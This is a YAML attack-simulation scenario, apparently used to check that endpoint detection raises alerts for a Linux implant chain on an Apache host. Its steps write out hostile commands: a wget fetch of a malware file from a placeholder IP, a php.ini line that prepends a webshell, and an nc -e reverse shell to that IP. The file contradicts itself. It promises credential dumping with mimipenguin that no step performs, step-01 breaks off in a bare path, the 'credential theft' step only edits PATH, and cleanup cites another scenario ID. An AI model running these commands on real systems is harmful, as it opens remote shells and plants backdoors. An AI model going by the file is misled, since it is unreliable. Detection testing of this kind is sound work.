scenario_id: SIM-EDR-024
name: SysGoRAT Implant with systemd Persistence and In-Memory Shell
version: '1.0'
status: active
plane: EDR
detection_types:
- BIOC
- XQL
- IOC
uc_ref: UCS-EDR-02
tc_ref: TC-EDR-03
tc_refs:
- TC-EDR-03
- TC-EDR-05
pov_scenario_id: POV-SC-021
uc_name: Endpoint Detection & Response
tc_name: Validate multi-method malware detection (local sandbox, behavioral, static analysis)
mitre_tactic: TA0006
mitre_tactic_name: Credential Access
mitre_technique: T1003.008
mitre_technique_name: 'OS Credential Dumping: /etc/passwd and /etc/shadow'
additional_techniques:
- technique: T1552.001
  name: 'Unsecured Credentials: Credentials In Files'
- technique: T1003
  name: OS Credential Dumping
threat_report: 'Unit42 - Rocke: The Champion of Monero Miners'
threat_report_url: https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/
execution_identity:
  default: www-data
  options:
  - www-data
  - root
  - nobody
  - svc-backup
push_supported: true
pull_supported: true
validation_methodology: Endpoint Signal Injection & Detection Accuracy
methodology_family: F1
primary_kpi: MTTD
threshold:
  kpi: MTTD
  op: ≤
  value: 300
  unit: seconds
success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected

  XDR BIOC / XQL detections, and the mean time from signal emit to alert

  creation is within the MTTD budget. Each step''s expected_detections row is

  validated against dataset=xdr_data.

  '
moat_tier: LEAD
cgo_anchor:
  image_name: apache2
  primary_username: www-data
external_tools:
- name: Atomic Red Team
  source: https://github.com/redcanaryco/atomic-red-team
  type: script
  install_inline: false
  adapter_ref: TOOL-ATOMIC-RED-TEAM
- name: mimipenguin
  source: https://github.com/huntergregal/mimipenguin
  type: script
  install_inline: true
steps:
- id: step-01
  name: Create systemd service
  command: 'mkdir -p /tmp/sysupdate

    wget -O /tmp/sysupdate/sysupdate.go https://192.0.2.100/malware/sysupdate.go

    chmod +x /tmp/sysupdate/sysupdate.go

    /systemd/system/sys-update.service

    '
  identity: www-data
  mitre_technique: T1543.002
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Systemd Service Creation
    ttp_ref: TTP-2026-0184
    detection_id: bioc-systemd-service-creation
- id: step-02
  name: Inject PHP webshell
  command: echo "auto_prepend_file = '/tmp/webshell.php'" >> /etc/php/7.4/apache2/php.ini
  identity: www-data
  mitre_technique: T1505.003
  expected_detections:
  - plane: EDR
    type: BIOC
    description: PHP Webshell Injection
    ttp_ref: TTP-2026-0184
    detection_id: bioc-php-webshell-injection
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Modify .bashrc for credential theft
  command: echo "export PATH=$PATH:/usr/local/bin" >> /home/www-data/.bashrc
  identity: www-data
  mitre_technique: T1546.004
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Bashrc Credential Theft
    ttp_ref: TTP-2026-0184
    detection_id: bioc-bashrc-credential-theft
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Execute in-memory reverse shell
  command: bash -c 'nc -e /bin/bash 192.0.2.100 4444'
  identity: www-data
  mitre_technique: T1059.004
  expected_detections:
  - plane: EDR
    type: BIOC
    description: In-Memory Reverse Shell
    ttp_ref: TTP-2026-0184
    detection_id: bioc-in-memory-reverse-shell
  causality:
    parent_step: step-03
    pivot: process_lineage
cleanup:
  commands:
  - rm -f /tmp/mimipenguin.sh /tmp/mimi_output.txt
  - echo '[CortexSim] SIM-EDR-001 cleanup complete'
author: Henry Reed
created: '2026-04-14'
last_updated: '2026-04-14'
tags:
- credential-access
- mimipenguin
- shadow-file
- ssh-keys
- endpoint-security
